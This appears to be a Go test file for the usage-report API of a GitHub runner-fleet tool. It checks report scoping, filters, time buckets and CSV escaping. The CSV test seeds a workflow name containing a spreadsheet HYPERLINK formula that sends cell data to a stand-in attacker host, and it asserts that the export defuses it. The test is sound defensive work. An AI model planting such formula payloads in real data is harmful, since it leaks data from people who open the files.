package api

import (
	"encoding/csv"
	"encoding/json"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/eyupio/zoomies/internal/store"
)

// A workflow can be called anything by anyone who can push to a repository the
// App can see, and its name lands in the first column of the export. Excel and
// Sheets evaluate a cell that begins with a formula character even when the CSV
// quoted it, so the operator who opens the export must get text, not a formula
// somebody else wrote.
func TestUsageCSVDefusesCellsThatWouldBeFormulas(t *testing.T) {
	h := newHarness(t)
	u, _ := h.user("viewer", store.RoleViewer)

	base := time.Date(2026, 3, 1, 12, 0, 0, 0, time.UTC)
	started, done := base.Add(time.Minute), base.Add(2*time.Minute)
	// Matched, because usage reports this fleet's jobs and a job no pool
	// claimed is somebody else's hosted runner. What is under test here is the
	// export's escaping, so the job has to be one that reaches the export.
	if _, err := h.st.UpsertJob(h.ctx, &store.Job{
		GitHubJobID: 4242, Repo: "acme/widgets", JobName: "build",
		Workflow: `=HYPERLINK("https://evil.example/?"&A1,"open")`,
		Matched:  true,
		State:    store.JobCompleted, QueuedAt: base, StartedAt: &started, CompletedAt: &done,
	}); err != nil {
		t.Fatalf("UpsertJob: %v", err)
	}

	resp := h.do(request{method: http.MethodGet, cookie: h.session(u),
		path: "/api/v1/usage.csv?group_by=workflow&from=" + base.Add(-time.Hour).Format(time.RFC3339) +
			"&to=" + base.Add(time.Hour).Format(time.RFC3339)})
	resp.mustStatus(t, http.StatusOK, "usage csv")

	records, err := csv.NewReader(strings.NewReader(string(resp.body))).ReadAll()
	if err != nil {
		t.Fatalf("the export is not valid CSV: %v", err)
	}
	if len(records) != 2 {
		t.Fatalf("got %d records, want a header and one row: %q", len(records), resp.body)
	}
	if got := records[1][0]; !strings.HasPrefix(got, "'=") {
		t.Errorf("group cell = %q; a leading formula character must be neutralised with an apostrophe", got)
	}
}

// TestUsageReportsOnlyThisFleetsJobs is the wiring from the route to the scope.
//
// The report exists to answer what this fleet consumed. A job GitHub ran on one
// of its own hosted runners used no runner here, waited in no queue of ours and
// cost this fleet nothing, so counting it inflates every column on the page.
func TestUsageReportsOnlyThisFleetsJobs(t *testing.T) {
	h := newHarness(t)
	u, _ := h.user("viewer", store.RoleViewer)

	base := time.Date(2026, 3, 1, 12, 0, 0, 0, time.UTC)
	started, done := base.Add(time.Minute), base.Add(2*time.Minute)
	for _, j := range []*store.Job{
		{GitHubJobID: 5001, Repo: "acme/ours", JobName: "build", Workflow: "ci", Matched: true,
			State: store.JobCompleted, QueuedAt: base, StartedAt: &started, CompletedAt: &done},
		// No pool claimed it and no runner here ran it: somebody else's.
		{GitHubJobID: 5002, Repo: "acme/theirs", JobName: "build", Workflow: "ci",
			State: store.JobCompleted, QueuedAt: base, StartedAt: &started, CompletedAt: &done},
	} {
		if _, err := h.st.UpsertJob(h.ctx, j); err != nil {
			t.Fatalf("seeding %s: %v", j.Repo, err)
		}
	}

	resp := h.do(request{method: http.MethodGet, cookie: h.session(u),
		path: "/api/v1/usage?group_by=repository&from=" + base.Add(-time.Hour).Format(time.RFC3339) +
			"&to=" + base.Add(time.Hour).Format(time.RFC3339)})
	resp.mustStatus(t, http.StatusOK, "usage by repository")

	body := string(resp.body)
	if !strings.Contains(body, "acme/ours") {
		t.Errorf("this fleet's own repository is missing from the report: %s", truncate(resp.body))
	}
	if strings.Contains(body, "acme/theirs") {
		t.Errorf("a repository whose jobs ran on hosted runners is in the report: %s", truncate(resp.body))
	}
}

func TestCSVTextLeavesOrdinaryNamesAlone(t *testing.T) {
	for _, s := range []string{"", "acme/widgets", "build and test", "zoomies-linux-x64", "ins_k3f9qz2m"} {
		if got := csvText(s); got != s {
			t.Errorf("csvText(%q) = %q, want it unchanged", s, got)
		}
	}
	for _, s := range []string{"=1+1", "+1", "-1", "@SUM(A1)", "\tx", "\rx"} {
		if got := csvText(s); got != "'"+s {
			t.Errorf("csvText(%q) = %q, want an apostrophe prefix", s, got)
		}
	}
}

func TestUsageExactKeyFilterMatchesJSONAndCSV(t *testing.T) {
	h := newHarness(t)
	u, _ := h.user("usage-viewer", store.RoleViewer)
	base := time.Date(2026, 3, 1, 12, 0, 0, 0, time.UTC)
	for i, repo := range []string{"acme/one", "acme/two"} {
		if _, err := h.st.UpsertJob(h.ctx, &store.Job{GitHubJobID: int64(9900 + i), Repo: repo, Matched: true, State: store.JobQueued, QueuedAt: base}); err != nil {
			t.Fatal(err)
		}
	}
	for _, suffix := range []string{"", ".csv"} {
		resp := h.do(request{method: http.MethodGet, cookie: h.session(u), path: "/api/v1/usage" + suffix + "?group_by=repository&key=acme%2Fone&from=" + base.Add(-time.Hour).Format(time.RFC3339) + "&to=" + base.Add(time.Hour).Format(time.RFC3339)})
		resp.mustStatus(t, http.StatusOK, "filtered usage")
		if !strings.Contains(string(resp.body), "acme/one") || strings.Contains(string(resp.body), "acme/two") {
			t.Fatalf("wrong filter for %s: %s", suffix, resp.body)
		}
	}
}

// The width of a bucket can be asked for, within a bound.
//
// A punch card of a week is 168 squares an hour wide, and the route's own rule
// would cut that week into seven days. Hourly buckets over a year, times every
// repository, is a payload nobody wants, so the request is refused past a
// fortnight with a reason that says what to ask for instead.
func TestUsageIntervalCanBeAskedForWithinItsBound(t *testing.T) {
	h := newHarness(t)
	u, _ := h.user("viewer", store.RoleViewer)

	base := time.Date(2026, 3, 1, 0, 0, 0, 0, time.UTC)
	started, done := base.Add(time.Minute), base.Add(2*time.Minute)
	if _, err := h.st.UpsertJob(h.ctx, &store.Job{
		GitHubJobID: 4343, Repo: "acme/widgets", JobName: "build", Workflow: "ci", Matched: true,
		State: store.JobCompleted, QueuedAt: base, StartedAt: &started, CompletedAt: &done,
		Conclusion: "success",
	}); err != nil {
		t.Fatalf("UpsertJob: %v", err)
	}

	ask := func(days int, interval string) *response {
		path := "/api/v1/usage?group_by=repository&from=" + base.Format(time.RFC3339) +
			"&to=" + base.Add(time.Duration(days)*24*time.Hour).Format(time.RFC3339)
		if interval != "" {
			path += "&interval=" + interval
		}
		return h.do(request{method: http.MethodGet, cookie: h.session(u), path: path})
	}
	buckets := func(resp *response) int {
		var body struct {
			Items []store.UsageRow `json:"items"`
		}
		if err := json.Unmarshal(resp.body, &body); err != nil {
			t.Fatalf("decoding usage: %v", err)
		}
		if len(body.Items) != 1 {
			t.Fatalf("got %d rows, want the one repository", len(body.Items))
		}
		return len(body.Items[0].History)
	}

	resp := ask(7, "hour")
	resp.mustStatus(t, http.StatusOK, "a week in hours")
	if n := buckets(resp); n != 7*24 {
		t.Errorf("a week in hours has %d buckets, want %d", n, 7*24)
	}
	resp = ask(7, "")
	resp.mustStatus(t, http.StatusOK, "a week left to the rule")
	if n := buckets(resp); n != 7 {
		t.Errorf("a week left to the rule has %d buckets, want 7", n)
	}
	resp = ask(1, "day")
	resp.mustStatus(t, http.StatusOK, "a day in days")
	if n := buckets(resp); n != 1 {
		t.Errorf("a day in days has %d buckets, want 1", n)
	}

	resp = ask(15, "hour")
	resp.mustStatus(t, http.StatusBadRequest, "hours past the bound")
	if !strings.Contains(string(resp.body), "at most 14 days") {
		t.Errorf("the refusal does not say what the bound is: %s", resp.body)
	}
	resp = ask(1, "minute")
	resp.mustStatus(t, http.StatusBadRequest, "a width that is not a width")
}
